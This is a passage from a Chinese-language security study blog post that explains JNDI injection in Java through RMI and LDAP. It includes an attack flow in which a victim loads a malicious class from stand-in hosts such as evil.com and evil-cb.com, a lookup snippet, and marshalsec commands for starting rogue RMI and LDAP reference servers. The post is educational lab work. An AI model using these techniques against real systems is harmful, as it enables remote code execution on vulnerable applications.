class="string">&quot;gogogo&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>Exploit.java</code>还是原来的弹出计算器，我们在该文件目录启动一个http服务</p>
+<p><font color="red">需要注意的是：Exploit.class文件不能在本地目录，需要在其他地方，否则classpath会直接请求本地的Exploit.class文件，而不去请求http服务下的Exploit.class文件。</font></p>
+<p><img src="/images/image-20221118104053712.png" alt="image-20221118104053712"></p>
+<p>主要是Server端，由原来的绑定一个实例改为绑定一个引用（<code>Reference</code>），<font color="red">这个引用允许从不同的地址来加载代码</font></p>
+<p><img src="/images/image-20221118103458631.png" alt="image-20221118103458631"></p>
+<p>第一个参数是类名，第二个参数是 factory，我觉得 factory 是 Jndi 很好的一个表示，我们可以通过这一个 factory 来代表一个类；第三个参数为地址，这个简单。</p>
+<p>通过这个引用（<code>Reference</code>）加载类的话，会初始化该类（Exploit），也就是说我们也可以把执行代码的地方写在静态代码块里面。</p>
+<blockquote>
+<p>关于Exploit.java文件需要注意：</p>
+<ol>
+<li>文件不能申明包名，即package xxx。声明后编译的class文件函数名称会加上包名从而不匹配。</li>
+<li>把Exploit.java及其编译的文件放到其他目录下，不然会在当前目录中直接找到这个类。不起web服务也会命令执行成功。</li>
+<li>java版本小于1.8u121。之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址，不再能够从指定codebase中下载字节码。</li>
+</ol>
+</blockquote>
+<p>所以说本质上，jndi注入就是一个类加载的问题。</p>
+<p>具体</p>
+<h3 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h3><p>只要攻击者能够：</p>
+<ol>
+<li>控制RMI客户端去调用指定RMI服务器</li>
+<li>在可控RMI服务器上绑定Reference对象，Reference对象指定远程恶意类</li>
+<li>远程恶意类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码</li>
+</ol>
+<p>就可以达到RCE的效果。fasjson组件漏洞rmi、ldap的利用形式正是使用lndi注入，而不是有关RMI反序列化。</p>
+<p>整个利用过程为：</p>
+<p><img src="/images/image-20221118154544326.png" alt="image-20221118154544326"></p>
+<blockquote>
+<ol>
+<li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li>
+<li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li>
+<li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code> 想绑定的 ReferenceWrapper 对象（<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>）；</li>
+<li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li>
+<li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li>
+<li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li>
+</ol>
+</blockquote>
+<p><font color="red">疑问：为什么在看RMI的时候，执行命令是在RMI的服务端，但是上面执行命令却是在客户端呢？</font></p>
+<p><font color="red">答案是：漏洞的主要原理是RMI远程对象加载，即RMI Class Loading机制，会导致RMI客户端命令执行的。</font></p>
+<h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><p>ldap 是一种协议，并不是 Java 独有的。</p>
+<p>LDAP 既是一类服务，也是一种协议，定义在 <a target="_blank" rel="noopener" href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251</a>(<a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511</a>) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 <strong>X.500-lite</strong>。</p>
+<p>LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p>
+<p>LDAP 的请求和响应是 <strong>ASN.1</strong> 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind&#x2F;Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。</p>
+<p>利用方式是一样的，只需要把客户端lookup请求我们启动的ldap服务即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="comment">//jndi调用</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//        RemoteObj obj = (RemoteObj) initialContext.lookup(&quot;rmi://127.0.0.1:1099/remoteObj&quot;);</span></span><br><span class="line">        initialContext.lookup(<span class="string">&quot;ldap://127.0.0.1:1389/remoteObj&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们使用我们使用<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec反序列化工具</a>起rmi、ldap服务，rmi默认端口是1099，ldap默认端口是1389，可以不加端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Exploit port</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8000/#Exploit port</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20221118164253244.png" alt="image-20221118164253244"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/study-everyday/p/6723313.html">JNDI是什么，怎么理解 - 明志健致远 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://jiges.github.io/2017/12/08/JNDI%E6%98%AF%E4%BB%80%E4%B9%88/">JNDI是什么 | 鸡哥の博客 (jiges.github.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/tutorial/jndi/index.html">Trail: Java Naming and Directory Interface (The Java™ Tutorials) (oracle.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">BlackHat 2016 回顾之 JNDI 注入简单解析 (rickgray.me)</a></p>
+<p>java安全漫谈</p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.github.io/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">Java反序列化之JNDI学习 | 芜风 (drun1baby.github.io)</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://yingzui.github.io">yingzui</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yingzui.github.io/2022/11/20/JNDI%E6%B3%A8%E5%85%A5/">http://yingzui.github.io/2022/11/20/JNDI%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yingzui.github.io" target="_blank">yingzui's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a><a class="post-meta__tags" href="/tags/RMI/">RMI</a><a class="post-meta__tags" href="/tags/JNDI/">JNDI</a></div><div class="post_share"><div class="social-share" data-image="/img/default.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/11/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RMI/"><img class="next-cover" src="/img/default.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java反序列化-RMI</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/11/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RMI/" title="java反序列化-RMI"><img class="cover" src="/img/default.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-08</div><div class="title">java反序列化-RMI</div></div></a></div><div><a href="/2022/10/14/ysoserial%E4%B9%8BURLDNS/" title="ysoserial之URLDNS"><img class="cover" src="/img/default.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-14</div><div class="title">ysoserial之URLDNS</div></div></a></div><div><a href="/2022/10/14/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections-1/" title="Java反序列化-CommonsCollections-1"><img class="cover" src="/img/default.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-14</div><div class="title">Java反序列化-CommonsCollections-1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yingzui</div><div class="author-info__description">菜狗一个罢了</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yingzui"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yingzui" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI"><span class="toc-number">1.1.</span> <span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89jndi%E4%B9%8B%E5%89%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text">有jndi之前</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89jndi%E4%B9%8B%E5%90%8E"><span class="toc-number">1.1.2.</span> <span class="toc-text">有jndi之后</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJNDI"><span class="toc-number">1.2.</span> <span class="toc-text">什么是JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.1.</span> <span class="toc-text">命名服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.2.</span> <span class="toc-text">目录服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.3.</span> <span class="toc-text">JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-RMI"><span class="toc-number">1.3.1.</span> <span class="toc-text">JNDI+RMI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">JNDI注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">小结一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-LDAP"><span class="toc-number">1.3.4.</span> <span class="toc-text">JNDI+LDAP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.4.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/11/20/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入">JNDI注入</a><time datetime="2022-11-20T09:05:26.000Z" title="发表于 2022-11-20 17:05:26">2022-11-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/11/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RMI/" title="java反序列化-RMI">java反序列化-RMI</a><time datetime="2022-11-08T14:09:49.000Z" title="发表于 2022-11-08 22:09:49">2022-11-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/14/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E5%9C%A8%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/" title="Hexo博客搭建之在文章中插入图片">Hexo博客搭建之在文章中插入图片</a><time datetime="2022-10-14T11:36:37.000Z" title="发表于 2022-10-14 19:36:37">2022-10-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/14/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections-1/" title="Java反序列化-CommonsCollections-1">Java反序列化-CommonsCollections-1</a><time datetime="2022-10-14T10:26:04.000Z" title="发表于 2022-10-14 18:26:04">2022-10-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/14/ysoserial%E4%B9%8BURLDNS/" title="ysoserial之URLDNS">ysoserial之URLDNS</a><time datetime="2022-10-14T10:10:36.000Z" title="发表于 2022-10-14 18:10:36">2022-10-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By yingzui</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
